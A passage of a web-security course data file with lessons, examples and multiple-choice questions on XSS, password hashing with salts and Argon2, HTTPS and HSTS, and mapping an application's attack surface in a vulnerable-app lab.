          'It can only be used to display alerts',
        ],
        answer: 1,
        explain:
          'XSS injects script that the victim’s browser executes *as part of the trusted site’s origin*. Because it runs same-origin, the Same-Origin Policy doesn’t restrict it: it can read the page and the site’s data the user can access, steal the session cookie (unless HttpOnly blocks JS access), and perform authenticated actions as the victim — effectively hijacking their session on that site. Stored XSS is worse still, running for every viewer (including admins). The defence is output-encoding untrusted data into HTML so it stays text, plus CSP and HttpOnly.',
        hint: 'Where does the injected script run, and in whose origin — so what does the SOP fail to stop?',
      },
    },

    {
      id: 'bweb-b-10',
      title: 'Storing passwords safely',
      read: `Web apps authenticate users with passwords, so how those passwords are **stored** is a critical security decision — and a very common place real breaches turn catastrophic. The rule: **never store passwords in a form you can reverse to the original.**

## Never store plaintext

If passwords are stored in plaintext, a database breach hands the attacker every user's actual password — and because people reuse passwords, that compromises their accounts *everywhere else* too. Storing plaintext passwords is among the most serious and basic failures there is.

## Hashing, not encryption

The right approach is **hashing**: run each password through a **one-way** function that produces a fixed-length hash, and store the *hash*, not the password. To check a login, hash the submitted password and compare to the stored hash. Because hashing is one-way, you can verify a password without ever storing (or being able to recover) the original — so a database breach doesn't directly reveal passwords.

Note: **hashing ≠ encryption.** Encryption is reversible (with the key); hashing is not. Passwords should be *hashed* (one-way), not encrypted (reversible), because there's no legitimate need to ever recover the original password.

## Use a *password* hash, and salt it

Not all hashes are suitable. Fast general-purpose hashes (MD5, SHA-256) are **bad for passwords** because attackers can compute billions of guesses per second and crack weak passwords, and can precompute lookup tables. Two requirements:

- **Salting** — add a unique random **salt** to each password before hashing, and store the salt alongside the hash. This ensures two users with the same password get different hashes, and defeats precomputed (rainbow) tables — the attacker must crack each password individually.
- **A slow, adaptive password-hashing algorithm** — use **bcrypt**, **scrypt**, or **Argon2** (Argon2 is the modern recommendation). These are *deliberately slow* and resource-intensive (and tunable), so each guess costs the attacker real time — turning "billions of guesses a second" into a trickle, making cracking impractical for decent passwords. Modern algorithms handle salting for you.

## Why this matters

Assume your database *will* eventually be breached (assume-breach). If passwords are plaintext or badly hashed, that breach is a disaster affecting your users everywhere. If they're salted and hashed with bcrypt/scrypt/Argon2, the attacker gets hashes that are expensive to crack, buying your users time to change passwords and limiting the damage. The choice of password storage is what determines whether a breach is a manageable incident or a catastrophe — which is why "salt and hash with a slow, modern algorithm" is a non-negotiable baseline.

(Even better, reduce reliance on passwords: add **multi-factor authentication** so a stolen/cracked password alone isn't enough — covered later. But correct password storage is the foundation.)`,
      sample: {
        lang: 'text',
        caption: 'Plaintext vs. a proper salted, slow hash',
        code: `BAD - plaintext (a breach = every real password stolen):
  alice | Summer2024!

BAD - fast unsalted hash (crackable, rainbow-table-able):
  alice | 5f4dcc3b5aa765d61d8327deb882cf99   (MD5 - do NOT use)

GOOD - salted, slow, adaptive (bcrypt/Argon2):
  alice | $argon2id$v=19$m=65536,t=3,p=4$<salt>$<hash>
  - unique salt per user (same password -> different hash)
  - deliberately slow -> each guess costs the attacker real time
  - one-way -> a breach yields hashes expensive to crack, not passwords`,
        output: `Never store plaintext. HASH (one-way), don't encrypt (reversible).
Use a SALT (unique per user, defeats rainbow tables) and a SLOW
adaptive algorithm (bcrypt/scrypt/Argon2) so cracking is
impractical. Assume the DB will be breached; storage decides
whether that's a catastrophe or a manageable incident.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why should passwords be stored using a slow, salted algorithm like bcrypt/scrypt/Argon2 rather than a fast hash like MD5 or SHA-256 (or plaintext)?',
        options: [
          'Fast hashes take too much storage',
          'Plaintext exposes real passwords on a breach; fast hashes can be cracked at billions of guesses per second and precomputed with rainbow tables. Salting makes each hash unique (defeating precomputed tables and forcing per-password cracking), and a deliberately slow, adaptive algorithm makes each guess costly — so even after a breach, decent passwords are impractical to crack',
          'MD5 is not a real hash function',
          'Slow algorithms make the website faster',
        ],
        answer: 1,
        explain:
          'Assume the database will eventually be breached. Plaintext then leaks every real password (and, via reuse, users’ other accounts). Fast general-purpose hashes (MD5/SHA-256) are crackable at enormous speeds and vulnerable to precomputed rainbow tables. Salting (a unique random value per password) ensures identical passwords hash differently and defeats precomputation, forcing individual cracking; a slow, adaptive algorithm (bcrypt/scrypt/Argon2) makes each guess computationally expensive, so cracking decent passwords becomes impractical. That combination turns a breach from catastrophic into manageable — the non-negotiable baseline (ideally plus MFA).',
        hint: 'What two properties (uniqueness per password, cost per guess) make cracking impractical even after the hashes leak?',
      },
    },

    {
      id: 'bweb-b-11',
      title: 'HTTPS for the web',
      read: `You met TLS/HTTPS in earlier tracks; here's why it's non-negotiable specifically for web apps. **HTTPS** (HTTP over TLS) protects the connection between the browser and the server, and without it, web security is impossible.

## What HTTPS provides

- **Confidentiality** — the traffic is encrypted, so anyone who can observe the connection (on shared Wi‑Fi, on the network path, at an ISP) **cannot read it**. Over plain HTTP, they'd see everything: pages, form data, and — critically — **session cookies and passwords in the clear** (recall the cleartext-credential capture from the networking track).
- **Integrity** — the traffic can't be tampered with in transit, so an attacker on the path can't modify pages or inject content.
- **Authentication** — the server's certificate proves the browser is talking to the real site (not an impostor), defending against man-in-the-middle attacks.

## Why plain HTTP is unacceptable for anything real

Over HTTP, a network attacker (the MITM/ARP-spoofing/rogue-DHCP scenarios from the networking track, or just someone on the same Wi‑Fi) can:

- Read the **session cookie** → hijack the session → become the user.
- Read **submitted passwords and data**.
- **Modify** pages and inject malicious content (including scripts).

Session cookies and login credentials crossing an unencrypted connection is a fatal exposure — which is why the entire web has moved to HTTPS, and why the \`Secure\` cookie flag (send cookies only over HTTPS) exists.

## Doing HTTPS right (a first look)

- **HTTPS everywhere** — the whole site, not just the login page (otherwise the session cookie is exposed on other pages). Redirect HTTP to HTTPS.
- **HSTS (HTTP Strict Transport Security)** — a response header (\`Strict-Transport-Security\`) that tells the browser "always use HTTPS for this site", defeating downgrade attacks and preventing the first-visit HTTP request from being intercepted.
- **Valid certificates, kept current** — use a trusted CA (free via **Let's Encrypt**), automate renewal so certs don't expire, and never train users to click through certificate warnings (which would mask a real MITM — the TLS lesson from earlier tracks).
- **Modern TLS config** — disable old, broken protocol versions and weak ciphers (TLS 1.2/1.3 only).

## The bottom line

HTTPS is the baseline that makes everything else meaningful: there's no point in strong passwords, secure sessions, and careful input handling if the whole conversation — cookies and all — travels in the clear for any network observer to read and modify. For a web app, HTTPS everywhere, with HSTS and valid auto-renewed certificates, is a foundational, non-negotiable control.`,
      sample: {
        lang: 'text',
        caption: 'The difference HTTPS makes to a network eavesdropper',
        code: `Over plain HTTP (attacker on the same Wi-Fi / network path sees):
  POST /login  username=alice&password=Summer2024!   <- password!
  Cookie: session=9f3a...                             <- session, stolen
  -> the eavesdropper reads credentials AND hijacks the session.

Over HTTPS (same attacker sees):
  ...encrypted bytes...  (unreadable, untamperable)
  + the certificate proves it's the real server (not an impostor)

Plus: HSTS header -> browser always uses HTTPS (no downgrade).`,
        output: `HTTPS gives confidentiality (no eavesdropping on cookies/
passwords), integrity (no tampering), and authentication (real
server). Plain HTTP exposes sessions and credentials to any
network observer. HTTPS everywhere + HSTS + valid auto-renewed
certs is a non-negotiable web baseline.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is serving a web app over plain HTTP (instead of HTTPS) a fatal security problem, even if the passwords are well hashed on the server?',
        options: [
          'HTTP is slower than HTTPS',
          'Over HTTP the connection is unencrypted, so any network observer (e.g. on shared Wi‑Fi or the path) can read the traffic — including the session cookie and the password as submitted — and can tamper with pages; hashing passwords at rest does nothing to protect them in transit or to protect the session cookie',
          'HTTP cannot serve HTML',
          'HTTPS is only needed for the login page',
        ],
        answer: 1,
        explain:
          'Good password hashing protects the stored passwords if the database is breached, but it does nothing for data in transit. Over HTTP, a network attacker reads everything on the wire — the password exactly as the user submits it, and the session cookie (letting them hijack the session without any password) — and can modify pages/inject content. That’s a fatal exposure, which is why the whole site (not just login) needs HTTPS, with HSTS and valid certificates, and why the Secure cookie flag exists. Transit protection (HTTPS) and at-rest protection (hashing) are both required.',
        hint: 'Hashing protects stored passwords. What protects the password and session cookie while they travel across the network?',
      },
    },

    {
      id: 'bweb-b-12',
      title: 'Project: set up a lab and map an app',
      read: `Bring the level together into the web defender's starting exercise: **set up a safe vulnerable-app lab, explore it through a proxy, and map its attack surface** — the foundation for everything the later levels do.

## The exercise

1. **Set up the lab** — run a deliberately vulnerable app locally and isolated: **OWASP Juice Shop** (modern) or **DVWA** (classic), in a container or VM. These are *designed* to be attacked and are safe/legal to practise on. Also work through **PortSwigger Web Security Academy** labs (free, permission built in).
2. **Set up an intercepting proxy** — **Burp Suite Community** or **OWASP ZAP** — and route your browser through it, so you see the real HTTP requests and responses behind the UI.
3. **Explore and map the attack surface** — browse the whole app through the proxy and catalogue:
   - Every **endpoint/page** and its **parameters** (query, path, body).
   - Every **form** (including hidden fields).
   - The **cookies** (are session cookies HttpOnly, Secure, SameSite?).
   - The **headers** the app sets (any security headers? — mostly a later topic).
   - Where **input** enters and where it appears in **output** (candidates for injection and XSS).
   - The **authentication** flow (how login/session work) and any **access control** (what needs which role).
4. **Reason about each entry point** — for each place input enters, ask the level's questions: is this trusted when it shouldn't be? Could this input become code (injection/XSS)? Is this check only client-side? Is the session cookie protected? Is it all over HTTPS?

## Practise the mindset

You're not (yet) exploiting — you're **mapping and reasoning**, building the habit of seeing a web app as a set of entry points where untrusted input arrives and might be mishandled. Notice a hidden \`price\` field, a search term reflected into the page, a session cookie without \`HttpOnly\`, a "you must be admin" check that might be client-side only — each is a hypothesis to investigate in the later levels.

## The measure of success

You can stand up a safe lab, see the true requests behind any web app through a proxy, and produce a **map of its attack surface** — every entry point, the session/auth mechanism, and the candidate weaknesses — reasoning about each with the level's principles: never trust input, data vs code, enforce server-side, protect the session, HTTPS everywhere.

> The level distilled: a web app is a **request/response conversation** where the **client controls the entire request** and the server must **never trust it**. Vulnerabilities come from **trusting input** or letting **data become code** (injection into queries, XSS into pages); defences come from **validating and safely handling input server-side**, **protecting the session** (HttpOnly/Secure cookies, good password storage), and **HTTPS everywhere**. Map the surface, hold those principles, and you're ready to learn — and defend against — the full OWASP Top 10 in the levels ahead.`,
      sample: {
        lang: 'text',
        caption: 'An attack-surface map of a web app (the project deliverable)',
        code: `App: Juice Shop (lab)   | proxy: Burp/ZAP routing the browser

Endpoint            Input (entry points)         Candidate concern
------------------------------------------------------------------------
GET /search?q=      q (query param)              reflected -> XSS?
GET /product/:id    id (path)                    other users' data -> access ctrl?
POST /login         email, password (body)       auth; brute-force? HTTPS?
POST /feedback      comment (body, STORED)       stored -> XSS?
GET /api/user/:id   id (path), Bearer token      IDOR? authorization?
Cookie: token=...   session cookie               HttpOnly? Secure? SameSite?
Headers set         (few security headers)       CSP/HSTS missing?

For each: is input trusted? could it become code? server-side check?`,
        output: `Deliverable: the app's attack surface mapped through a proxy -
every entry point, the auth/session mechanism, candidate
weaknesses - reasoned with the level's principles. That map is
where finding and fixing vulnerabilities (the OWASP Top 10 in
the levels ahead) begins.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What is the value of "mapping the attack surface" of a web app through an intercepting proxy as a first step in defending it?',
        options: [
          'It automatically fixes all vulnerabilities',
          'It reveals every place untrusted input actually enters the app (parameters, forms, headers, cookies, uploads) and how the session/auth works — seen as the real requests behind the UI — giving you the catalogue of entry points and candidate weaknesses to reason about and secure, since nearly every web vulnerability starts with input entering somewhere',
          'It is only useful for attackers, not defenders',
          'It replaces the need to understand the app',
        ],
        answer: 1,
        explain:
          'Almost every web vulnerability begins with untrusted input arriving at some entry point and being mishandled. Mapping the attack surface through a proxy shows you the *real* requests behind the UI — every parameter, form field (including hidden ones), header, cookie, and upload — plus how authentication and sessions work. That catalogue of entry points and candidate weaknesses (a reflected search term, a hidden price, a cookie missing HttpOnly, an ID that might expose others’ data) is the foundation for systematically reasoning about and securing the app against the OWASP Top 10 — for defenders as much as attackers.',
        hint: 'If most vulnerabilities start with input entering somewhere, what does cataloguing every entry point give you?',
      },
    },
  ],
}

export default level
